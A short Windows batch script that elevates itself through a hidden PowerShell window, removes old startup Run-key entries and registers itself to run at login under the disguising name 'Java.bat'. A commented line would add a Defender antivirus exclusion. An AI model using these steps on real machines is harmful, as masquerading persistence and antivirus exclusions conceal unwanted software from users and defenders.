@echo off
:: Elevate if not admin
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: === Variables ===
set "SELF_PATH=%~f0"
set "REG_RUN=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_APPROVED=HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
set "REG_NAME=Java.bat"

:: ✅ Delete i.bat from both registry locations
reg delete "%REG_RUN%" /v "i.bat" /f >nul 2>&1
reg delete "%REG_APPROVED%" /v "i.bat" /f >nul 2>&1

:: Optional: delete other stale entries
reg delete "%REG_RUN%" /v "JavaStartup" /f >nul 2>&1
reg delete "%REG_APPROVED%" /v "JavaStartup" /f >nul 2>&1

:: ✅ Add THIS script to run as "Java.bat"
reg add "%REG_RUN%" /v "%REG_NAME%" /d "\"%SELF_PATH%\"" /f

:: Exclude example (optional)
:: powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'"

:: Confirm to user
echo [✓] Java.bat registered. Reboot to see Task Manager update.
pause
exit
